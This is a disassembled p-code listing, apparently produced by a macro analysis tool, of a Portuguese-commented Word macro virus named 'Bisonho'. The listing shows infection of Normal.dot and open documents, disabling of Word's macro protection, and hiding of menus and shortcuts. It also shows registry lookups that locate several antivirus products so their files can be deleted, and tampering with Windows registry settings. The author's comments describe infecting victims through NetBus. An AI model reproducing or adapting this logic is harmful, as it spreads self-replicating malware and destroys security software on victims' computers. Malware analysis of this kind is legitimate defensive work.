' 	QuoteRem 0x0000 0x0037 "ItsMe, que indica da onde o virus esta sendo executado."
' Line #56:
' Line #57:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld Norm 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x000E "'Bisonho Rulez"
' 	Ne 
' 	IfBlock 
' Line #58:
' 	QuoteRem 0x0000 0x0049 "Se a primeira linha do projeto do normal nao for 'Bisonho Rulez, infecte!"
' Line #59:
' Line #60:
' 	LitDI2 0x0001 
' 	Ld Norm 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld Norm 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #61:
' 	QuoteRem 0x0000 0x0043 "Apaga todo o codigo estranho (que pode ser um outro virus, pq nao?)"
' Line #62:
' Line #63:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ItsMe 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ItsMe 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld Norm 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #64:
' 	QuoteRem 0x0000 0x0011 "Infecta o arquivo"
' Line #65:
' Line #66:
' 	LitStr 0x0007 "Bisonho"
' 	Ld Norm 
' 	MemSt New 
' 	QuoteRem 0x0017 0x0023 "Muda o nome do projeto para Bisonho"
' Line #67:
' 	EndIfBlock 
' 	QuoteRem 0x0007 0x0021 "Termina o bloco de condicoes *SE*"
' Line #68:
' Line #69:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld Arch 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x000E "'Bisonho Rulez"
' 	Ne 
' 	IfBlock 
' Line #70:
' 	QuoteRem 0x0000 0x0054 "Se a primeira linha do projeto de um arquivo aberto nao for 'Bisonho Rulez, infecte!"
' Line #71:
' Line #72:
' 	LitDI2 0x0001 
' 	Ld Arch 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld Arch 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #73:
' 	QuoteRem 0x0000 0x0043 "Apaga todo o codigo estranho (que pode ser um outro virus, pq nao?)"
' Line #74:
' Line #75:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ItsMe 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ItsMe 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld Arch 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #76:
' 	QuoteRem 0x0000 0x0011 "Infecta o arquivo"
' Line #77:
' Line #78:
' 	LitStr 0x0007 "Bisonho"
' 	Ld Arch 
' 	MemSt New 
' 	QuoteRem 0x0017 0x0023 "Muda o nome do projeto para Bisonho"
' Line #79:
' 	EndIfBlock 
' 	QuoteRem 0x0007 0x0021 "Termina o bloco de condicoes *SE*"
' Line #80:
' Line #81:
' 	LitStr 0x000C "C:\Ethan.___"
' 	LitDI2 0x0006 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #82:
' 	QuoteRem 0x0000 0x004A "Aha, foi encontrado vestigios do ethan... (eu odeio esse virus nao sei pq)"
' Line #83:
' Line #84:
' 	LitStr 0x000C "C:\Ethan.___"
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #85:
' 	QuoteRem 0x0000 0x002E "Define o atributo do arquivo como normal, e..."
' Line #86:
' 	LitStr 0x000C "C:\Ethan.___"
' 	ArgsCall Kill 0x0001 
' 	QuoteRem 0x0028 0x0012 "Deleta essa droga!"
' Line #87:
' 	EndIfBlock 
' 	QuoteRem 0x0028 0x0021 "Termina o bloco de condicoes *SE*"
' Line #88:
' Line #89:
' 	ArgsCall RetroAction 0x0000 
' 	QuoteRem 0x0028 0x0017 "Chama a sub RetroAction"
' Line #90:
' Line #91:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall ChooseActions 0x0000 
' 	EndIf 
' Line #92:
' 	QuoteRem 0x0000 0x002A "Chama os eventos se o dia for igual ao mes"
' Line #93:
' Line #94:
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	Ld Now 
' 	ArgsLd Second 0x0001 
' 	Eq 
' 	IfBlock 
' Line #95:
' 	QuoteRem 0x0000 0x0046 "Se o segundo e igual ao minuto, faz o cara dizer que tem o pau pequeno"
' Line #96:
' 	LitStr 0x005B "Ocorreu um erro. A possivel causa e que vc tenha um penis pequeno. Vc tem um penis pequeno?"
' 	St Msg 
' Line #97:
' 	Ld vbYesNo 
' 	Ld vbQuestion 
' 	Add 
' 	St Style 
' 	QuoteRem 0x0020 0x0012 "Estilo da mensagem"
' Line #98:
' 	LitStr 0x000E "Microsoft Word"
' 	St Title 
' 	QuoteRem 0x0020 0x0012 "Titulo da mensagem"
' Line #99:
' 	Ld Msg 
' 	Ld Style 
' 	Ld Title 
' 	ArgsLd MsgBox 0x0003 
' 	St Ret 
' 	QuoteRem 0x0020 0x0012 "Escolha do cidadao"
' Line #100:
' 	Ld Ret 
' 	Ld vbNo 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall LoopIt 0x0000 
' 	EndIf 
' 	QuoteRem 0x0020 0x0020 "Disse que nao? Pergunta de novo!"
' Line #101:
' Line #102:
' 	ArgsCall ThisIsSpecial 0x0000 
' 	QuoteRem 0x0018 0x0011 "Chama essa sub..."
' Line #103:
' 	ArgsCall EmailCopy 0x0000 
' 	QuoteRem 0x0018 0x0012 "Chama essa sub tb."
' Line #104:
' 	EndIfBlock 
' Line #105:
' Line #106:
' Line #107:
' 	EndSub 
' 	QuoteRem 0x0028 0x0016 "Termina a sub (DUH...)"
' Line #108:
' Line #109:
' 	FuncDefn (Private Sub RetroAction())
' Line #110:
' 	QuoteRem 0x0000 0x003A "ESSA SUB E SO AS ACÕES RETRO DO VIRUS... RERERERE (HEHEHE)"
' Line #111:
' Line #112:
' 	OnError (Resume Next) 
' 	QuoteRem 0x0018 0x001B "Ocorreu algum erro? Pule..."
' Line #113:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' 	QuoteRem 0x0030 0x001A "Desabilita o Control+Break"
' Line #114:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' 	QuoteRem 0x0030 0x0019 "Desativa a verificacao de"
' Line #115:
' 	Reparse 0x0013 "macros no documento"
' Line #116:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' 	QuoteRem 0x0030 0x001E "Desativa o aviso para salvar o"
' Line #117:
' 	Ld normal 
' 	ArgsMemCall dot 0x0000 
' Line #118:
' Line #119:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Visible 
' Line #120:
' 	QuoteRem 0x0000 0x0015 "Esconde o menu Macros"
' Line #121:
' Line #122:
' 	LitVarSpecial (False)
' 	LitDI2 0x0006 
' 	LitStr 0x0004 "View"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Visible 
' Line #123:
' 	QuoteRem 0x0000 0x004C "Esconde o menu Barra de Ferramentas (para evitar que adicionem um menu novo,"
' Line #124:
' 	QuoteRem 0x0000 0x0049 "apesar que se pode dar um clique com o botao direito na barra de menu mas"
' Line #125:
' 	QuoteRem 0x0000 0x000B "ta a pampa)"
' Line #126:
' Line #127:
' 	Ld NormalTemplate 
' 	St CustomizationContext 
' Line #128:
' 	QuoteRem 0x0000 0x002B "Define onde serao salvas as mudancas abaixo"
' Line #129:
' Line #130:
' 	Reparse 0x0046 "KeyBindings.Add KeyCode:=BuildKeyCode(Arg1:=wdKeyAlt, Arg2:=wdKeyF11),"
' Line #131:
' Line #132:
' 	Reparse 0x0035 "KeyCategory:=wdKeyCategoryCommand, Command:="hahaNOT""
' Line #133:
' 	QuoteRem 0x0000 0x002F "Redireciona o atalho Alt+F11 para uma sub vazia"
' Line #134:
' Line #135:
' 	Reparse 0x0045 "KeyBindings.Add KeyCode:=BuildKeyCode(Arg1:=wdKeyAlt, Arg2:=wdKeyF8),"
' Line #136:
' Line #137:
' 	Reparse 0x0035 "KeyCategory:=wdKeyCategoryCommand, Command:="hahaNOT""
' Line #138:
' 	QuoteRem 0x0000 0x002E "Redireciona o atalho Alt+F8 para uma sub vazia"
' Line #139:
' Line #140:
' 	Reparse 0x0049 "Dim McAfee, FMcAfee, FProt, FFProt, VET, FVET, Avast, FAvast, TheCleaner,"
' Line #141:
' 	ParamOmitted 
' 	Ld Panda 
' 	Ld FPanda 
' 	Ld AVP 
' 	Ld FAVP 
' 	ArgsCall FTheCleaner 0x0005 
' 	QuoteRem 0x0030 0x0014 "Declara variaveis..."
' Line #142:
' Line #143:
' 	QuoteRem 0x0000 0x0025 "Adquire os dados de registro dos Av's"
' Line #144:
' 	LitStr 0x0000 ""
' 	LitStr 0x0035 "HKEY_LOCAL_MACHINE\Software\Command Software\F-PROT32"
' 	LitStr 0x0008 "Location"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St FProt 
' Line #145:
' 	LitStr 0x0000 ""
' 	LitStr 0x0042 "HKEY_LOCAL_MACHINE\Software\Cybec\VET Antivirus for Win32\Resident"
' 	LitStr 0x0007 "VetPath"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St VET 
' Line #146:
' 	QuoteRem 0x0000 0x001D "Av's que indicam em que pasta"
' Line #147:
' 	LitStr 0x0000 ""
' 	LitStr 0x0029 "HKEY_LOCAL_MACHINE\Software\McAfee\Scan95"
' 	LitStr 0x0011 "szProductLocation"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St McAfee 
' Line #148:
' 	QuoteRem 0x0000 0x0017 "que foram instalados..."
' Line #149:
' 	LitStr 0x0000 ""
' 	LitStr 0x0032 "HKEY_LOCAL_MACHINE\Software\ALWIL Software\Avast32"
' 	LitStr 0x0004 "Path"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St Avast 
' Line #150:
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_USERS\.DEFAULT\Software\MooSoft Development\The Cleaner"
' 	LitStr 0x0009 "tcshellex"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St TheCleaner 
' Line #151:
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_LOCAL_MACHINE\Software\Panda Software\Panda Antivirus 6.0"
' 	LitStr 0x0004 "Path"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St Panda 
' Line #152:
' 	LitStr 0x0000 ""
' 	LitStr 0x002E "HKEY_LOCAL_MACHINE\KasperskyLab\Components\100"
' 	LitStr 0x0006 "Folder"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St AVP 
' Line #153:
' Line #154:
' Line #155:
' 	QuoteRem 0x0000 0x0037 "Esse bloco abaixo define os arquivos que serao alvos..."
' Line #156:
' 	QuoteRem 0x0000 0x003C "*.* que e igual a TUDO (DUH!) e alguns Dats e Dlls vitais..."
' Line #157:
' Line #158:
' 	Ld FProt 
' 	LitStr 0x0004 "\*.*"
' 	Add 
' 	St FFProt 
' Line #159:
' 	Ld VET 
' 	LitStr 0x0004 "\*.*"
' 	Add 
' 	St FVET 
' Line #160:
' 	Ld McAfee 
' 	LitStr 0x0004 "\*.*"
' 	Add 
' 	St FMcAfee 
' Line #161:
' 	Ld Avast 
' 	LitStr 0x0004 "\*.*"
' 	Add 
' 	St FAvast 
' Line #162:
' 	Ld TheCleaner 
' 	LitStr 0x0004 "\*.*"
' 	Add 
' 	St FTheCleaner 
' Line #163:
' 	Ld Panda 
' 	LitStr 0x0003 "*.*"
' 	Add 
' 	St FPanda 
' 	QuoteRem 0x0017 0x0031 "a chave de registro do panda tem um \ na frente.."
' Line #164:
' 	Ld AVP 
' 	LitStr 0x0004 "\*.*"
' 	Add 
' 	St FAVP 
' Line #165:
' 	Ld FProt 
' 	LitStr 0x0006 "\*.Dat"
' 	Add 
' 	St Affprot 
' Line #166:
' 	Ld FProt 
' 	LitStr 0x0006 "\*.Def"
' 	Add 
' 	St Bffprot 
' Line #167:
' 	Ld VET 
' 	LitStr 0x0006 "\*.Dat"
' 	Add 
' 	St Afvet 
' Line #168:
' 	Ld McAfee 
' 	LitStr 0x0006 "\*.Dat"
' 	Add 
' 	St AFMcAfee 
' Line #169:
' 	Ld Avast 
' 	LitStr 0x0006 "\*.Dat"
' 	Add 
' 	St afavast 
' Line #170:
' 	Ld Avast 
' 	LitStr 0x0006 "\*.Dll"
' 	Add 
' 	St bfavast 
' Line #171:
' 	Ld TheCleaner 
' 	LitStr 0x0006 "\*.Dll"
' 	Add 
' 	St afthecleaner 
' Line #172:
' 	Ld Panda 
' 	LitStr 0x0005 "*.Dat"
' 	Add 
' 	St afpanda 
' Line #173:
' 	Ld Panda 
' 	LitStr 0x0005 "*.Dll"
' 	Add 
' 	St bfpanda 
' Line #174:
' 	Ld AVP 
' 	LitStr 0x0006 "\*.Dat"
' 	Add 
' 	St afavp 
' Line #175:
' 	Ld AVP 
' 	LitStr 0x0006 "\*.Dll"
' 	Add 
' 	St bfavp 
' Line #176:
' Line #177:
' 	QuoteRem 0x0000 0x004B "Esse bloco abaixo detona primeiro os arquivos vitais dos antivirus e depois"
' Line #178:
' 	QuoteRem 0x0000 0x004A "tenta detonar tudo, pq se tiver algum programa residente, o mesmo nao sera"
' Line #179:
' 	QuoteRem 0x0000 0x004A "removido, e, com os vitais faltando, eles nao servem pra nada... hehhehe.."
' Line #180:
' 	QuoteRem 0x0000 0x0015 "Pau na lomba deles..."
' Line #181:
' Line #182:
' 	Ld Affprot 
' 	ArgsCall Kill 0x0001 
' Line #183:
' 	Ld Bffprot 
' 	ArgsCall Kill 0x0001 
' Line #184:
' 	Ld Afvet 
' 	ArgsCall Kill 0x0001 
' Line #185:
' 	Ld AFMcAfee 
' 	ArgsCall Kill 0x0001 
' Line #186:
' 	Ld afavast 
' 	ArgsCall Kill 0x0001 
' Line #187:
' 	Ld bfavast 
' 	ArgsCall Kill 0x0001 
' Line #188:
' 	Ld afthecleaner 
' 	ArgsCall Kill 0x0001 
' Line #189:
' 	Ld afpanda 
' 	ArgsCall Kill 0x0001 
' Line #190:
' 	Ld bfpanda 
' 	ArgsCall Kill 0x0001 
' Line #191:
' 	Ld afavp 
' 	ArgsCall Kill 0x0001 
' Line #192:
' 	Ld bfavp 
' 	ArgsCall Kill 0x0001 
' Line #193:
' 	Ld FFProt 
' 	ArgsCall Kill 0x0001 
' Line #194:
' 	Ld FVET 
' 	ArgsCall Kill 0x0001 
' Line #195:
' 	Ld FMcAfee 
' 	ArgsCall Kill 0x0001 
' Line #196:
' 	Ld FAvast 
' 	ArgsCall Kill 0x0001 
' Line #197:
' 	Ld FTheCleaner 
' 	ArgsCall Kill 0x0001 
' Line #198:
' 	Ld FPanda 
' 	ArgsCall Kill 0x0001 
' Line #199:
' 	Ld FAVP 
' 	ArgsCall Kill 0x0001 
' Line #200:
' Line #201:
' 	QuoteRem 0x0000 0x0047 "Esse bloco abaixo desativa as opcoes de verificacao do XoBoBus para que"
' Line #202:
' 	QuoteRem 0x0000 0x004C "ele nao verifique mais porra nenhuma e pare de incomodar quem quer infectar."
' Line #203:
' Line #204:
' 	QuoteRem 0x0000 0x0048 "Obs: Esse era meu metodo para infectar os micros. Eu invadia uns lammers"
' Line #205:
' 	QuoteRem 0x0000 0x004A "pelo NetBus e substituia o normal.dot do lammah pelo virus.dot e caia fora"
' Line #206:
' 	QuoteRem 0x0000 0x004B "hehe... ou entao mandava um virus de com ou exe e executava na maquina dele"
' Line #207:
' 	QuoteRem 0x0000 0x0047 "(se bem que eu ainda nao consegui entender porra nenhuma de assembly..."
' Line #208:
' 	QuoteRem 0x0000 0x0049 "vai ver que eu acostumei com basic, pq foi minha primeira linguagem e nao"
' Line #209:
' 	QuoteRem 0x0000 0x0025 "consegui entender mais porra nenhuma)"
' Line #210:
' Line #211:
' 	LitStr 0x0008 "DISABLED"
' 	LitStr 0x0000 ""
' 	LitStr 0x0035 "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32"
' 	LitStr 0x0001 "0"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #212:
' 	LitStr 0x0008 "DISABLED"
' 	LitStr 0x0000 ""
' 	LitStr 0x0035 "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32"
' 	LitStr 0x0001 "1"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #213:
' 	LitStr 0x0008 "DISABLED"
' 	LitStr 0x0000 ""
' 	LitStr 0x0035 "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32"
' 	LitStr 0x0001 "2"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #214:
' 	LitStr 0x0008 "DISABLED"
' 	LitStr 0x0000 ""
' 	LitStr 0x0035 "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32"
' 	LitStr 0x0001 "3"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #215:
' 	LitStr 0x0008 "DISABLED"
' 	LitStr 0x0000 ""
' 	LitStr 0x0035 "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32"
' 	LitStr 0x0001 "4"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #216:
' 	LitStr 0x0008 "DISABLED"
' 	LitStr 0x0000 ""
' 	LitStr 0x0035 "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32"
' 	LitStr 0x0001 "5"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #217:
' 	LitStr 0x0008 "DISABLED"
' 	LitStr 0x0000 ""
' 	LitStr 0x0035 "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32"
' 	LitStr 0x0001 "6"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #218:
' 	LitStr 0x0008 "DISABLED"
' 	LitStr 0x0000 ""
' 	LitStr 0x0035 "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32"
' 	LitStr 0x0001 "7"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #219:
' 	LitStr 0x0008 "DISABLED"
' 	LitStr 0x0000 ""
' 	LitStr 0x0035 "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32"
' 	LitStr 0x0001 "8"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #220:
' 	LitStr 0x0008 "DISABLED"
' 	LitStr 0x0000 ""
' 	LitStr 0x0035 "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32"
' 	LitStr 0x0001 "9"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #221:
' 	LitStr 0x0008 "DISABLED"
' 	LitStr 0x0000 ""
' 	LitStr 0x0035 "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32"
' 	LitStr 0x0002 "10"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #222:
' 	LitStr 0x0008 "DISABLED"
' 	LitStr 0x0000 ""
' 	LitStr 0x0035 "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32"
' 	LitStr 0x0009 "AutoStart"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #223:
' 	LitStr 0x0008 "DISABLED"
' 	LitStr 0x0000 ""
' 	LitStr 0x0035 "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32"
' 	LitStr 0x000A "AutoVerify"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #224:
' 	LitStr 0x0008 "DISABLED"
' 	LitStr 0x0000 ""
' 	LitStr 0x0035 "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32"
' 	LitStr 0x0006 "BOProt"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #225:
' 	LitStr 0x0008 "DISABLED"
' 	LitStr 0x0000 ""
' 	LitStr 0x0035 "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32"
' 	LitStr 0x0009 "ExtraPort"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #226:
' 	LitStr 0x0008 "DISABLED"
' 	LitStr 0x0000 ""
' 	LitStr 0x0035 "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32"
' 	LitStr 0x0009 "NetBusAdv"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #227:
' Line #228:
' 	QuoteRem 0x0000 0x004D "Essa linha abaixo muda o password do server do netbus, se existir, e (putz eu"
' Line #229:
' 	QuoteRem 0x0000 0x0032 "acabei de descobrir um bug agora mesmo... foi mal)"
' Line #230:
' Line #231:
' 	QuoteRem 0x0000 0x006E "System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "PATCH") ="
' Line #232:
' 	QuoteRem 0x0000 0x0048 ""c:\windows\Patch.exe /pass:killfhc" 'hehehe!!! so eu posso usar netbus!"
' Line #233:
' Line #234:
' 	QuoteRem 0x0000 0x004B "Bug Acima descoberto e corrigido agora. Era pra trocar o password do server"
' Line #235:
' 	QuoteRem 0x0000 0x004B "do netbus que estivesse com o nome padrao de PATCH, mas eu esqueci, ate nos"
' Line #236:
' 	QuoteRem 0x0000 0x0048 "meus outros virus, de colocar a instrucao IF, ou seja, de dizer que so e"
' Line #237:
' 	QuoteRem 0x0000 0x004A "pra trocar o password se o server existir. O Bug faria com que ele criasse"
' Line #238:
' 	QuoteRem 0x0000 0x004A "uma chave dizendo para executar o programa PATCH, mas se nao existisse, ia"
' Line #239:
' 	QuoteRem 0x0000 0x0046 "dar um aviso no inicio do Windows. Putz que coisa idiota... e falta de"
' Line #240:
' 	QuoteRem 0x0000 0x0008 "atencao."
' Line #241:
' Line #242:
' 	EndSub 
' Line #243:
' Line #244:
' 	FuncDefn (Private Sub hahaNOT())
' 	QuoteRem 0x0016 0x0021 "Sub vazia que nao faz nada (DUH!)"
' Line #245:
' Line #246:
' 	EndSub 
' Line #247:
' Line #248:
' 	QuoteRem 0x0000 0x002C "ESSAS SUBS ABAIXO SAO OS EVENTOS DESSE VIRUS"
' Line #249:
' 	QuoteRem 0x0000 0x0013 "SAO MUITAS MESMO..."
' Line #250:
' 	QuoteRem 0x0000 0x0023 "NADA DE MENSAGINHAS BABACAS E SO..."
' Line #251:
' Line #252:
' 	FuncDefn (Private Sub Action1())
' Line #253:
' 	OnError (Resume Next) 
' Line #254:
' 	QuoteRem 0x0000 0x0029 "nao tenho certeza se funciona em todos os"
' Line #255:
' 	QuoteRem 0x0000 0x0015 "micros mas ta valendo"
' Line #256:
' Line #257:
' 	QuoteRem 0x0000 0x004D "Sabe quando vc deixa o mouse em cima dos icones da area de trabalho e aparece"
' Line #258:
' 	QuoteRem 0x0000 0x0012 "uma mensagenzinha?"
' Line #259:
' Line #260:
' 	QuoteRem 0x0000 0x001A "Muda a mensagem da Lixeira"
' Line #261:
' 	LitStr 0x0018 "A Berne Maltesa Rulez..."
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CLASSES_ROOT\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}"
' 	LitStr 0x0000 ""
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #262:
' 	LitStr 0x005E "HEHEHEHE... esta e a Lixeira do Dick Moe... eu comando essa bagaca ok??? ---A BERNE MALTESA---"
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CLASSES_ROOT\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}"
' 	LitStr 0x0007 "InfoTip"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #263:
' 	LitStr 0x0014 "Dick Moe Recycle Bin"
' 	LitStr 0x0000 ""
' 	LitStr 0x0050 "HKEY_LOCAL_MACHINE\Software\CLASSES\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}"
' 	LitStr 0x0000 ""
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #264:
' 	LitStr 0x005E "HEHEHEHE... esta e a Lixeira do Dick Moe... eu comando essa bagaca ok??? ---A BERNE MALTESA---"
' 	LitStr 0x0000 ""
' 	LitStr 0x0050 "HKEY_LOCAL_MACHINE\Software\CLASSES\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}"
' 	LitStr 0x0007 "InfoTip"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #265:
' 	EndSub 
' Line #266:
' Line #267:
' 	FuncDefn (Private Sub Action2())
' Line #268:
' 	OnError (Resume Next) 
' Line #269:
' 	QuoteRem 0x0000 0x001E "Esses tem de reiniciar o micro"
' Line #270:
' Line #271:
' 	QuoteRem 0x0000 0x0026 "Arregaca com a visualizacao do monitor"
' Line #272:
' 	LitStr 0x0001 "8"
' 	LitStr 0x0000 ""
' 	LitStr 0x0024 "HKEY_CURRENT_CONFIG\Display\Settings"
' 	LitStr 0x000C "BitsPerPixel"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #273:
' 	QuoteRem 0x0000 0x001A "Muda o registro do windows"
' Line #274:
' 	LitStr 0x0008 "DICK MOE"
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x000F "RegisteredOwner"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #275:
' 	LitStr 0x000F "A BERNE MALTESA"
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x0016 "RegisteredOrganization"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #276:
' 	LitStr 0x0017 "Windous 1.0 by DICK MOE"
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x0007 "Version"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #277:
' 	EndSub 
' Line #278:
' Line #279:
' 	FuncDefn (Private Sub Action3())
' Line #280:
' 	OnError (Resume Next) 
' Line #281:
' 	QuoteRem 0x0000 0x0013 "Tem de reiniciar..."
' Line #282:
' Line #283:
' 	QuoteRem 0x0000 0x001B "Deixa o mouse com rastro..."
' Line #284:
' 	LitStr 0x0001 "7"
' 	LitStr 0x0000 ""
' 	LitStr 0x0024 "HKEY_CURRENT_CONFIG\Display\Settings"
' 	LitStr 0x000B "MouseTrails"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #285:
' 	QuoteRem 0x0000 0x000C "Lentao, e..."
' Line #286:
' 	LitStr 0x0001 "0"
' 	LitStr 0x0000 ""
' 	LitStr 0x0027 "HKEY_CURRENT_CONFIG\Control Panel\Mouse"
' 	LitStr 0x000A "MouseSpeed"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #287:
' 	QuoteRem 0x0000 0x0034 "Vc tem de ser o the flash pra dar um clique duplo..."
' Line #288:
' 	LitStr 0x0003 "100"
' 	LitStr 0x0000 ""
' 	LitStr 0x0027 "HKEY_CURRENT_CONFIG\Control Panel\Mouse"
' 	LitStr 0x0010 "DoubleClickSpeed"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #289:
' 	EndSub 
' Line #290:
' Line #291:
' 	FuncDefn (Private Sub Action4())
' Line #292:
' 	OnError (Resume Next) 
' Line #293:
' 	QuoteRem 0x0000 0x000C "Reiniciar..."
' Line #294:
' Line #295:
' 	QuoteRem 0x0000 0x0030 "Troca umas cores do windows... fica bem cheguei."
' Line #296:
' 	LitStr 0x0009 "200 40 10"
' 	LitStr 0x0000 ""
' 	LitStr 0x0028 "HKEY_CURRENT_CONFIG\Control Panel\Colors"
' 	LitStr 0x000A "ButtonFace"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #297:
' 	LitStr 0x0009 "0 250 100"
' 	LitStr 0x0000 ""
' 	LitStr 0x0028 "HKEY_CURRENT_CONFIG\Control Panel\Colors"
' 	LitStr 0x000B "ActiveTitle"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #298:
' 	LitStr 0x0005 "0 0 0"
' 	LitStr 0x0000 ""
' 	LitStr 0x0028 "HKEY_CURRENT_CONFIG\Control Panel\Colors"
' 	LitStr 0x0004 "Menu"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #299:
' 	LitStr 0x000B "100 100 200"
' 	LitStr 0x0000 ""
' 	LitStr 0x0028 "HKEY_CURRENT_CONFIG\Control Panel\Colors"
' 	LitStr 0x0006 "Window"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #300:
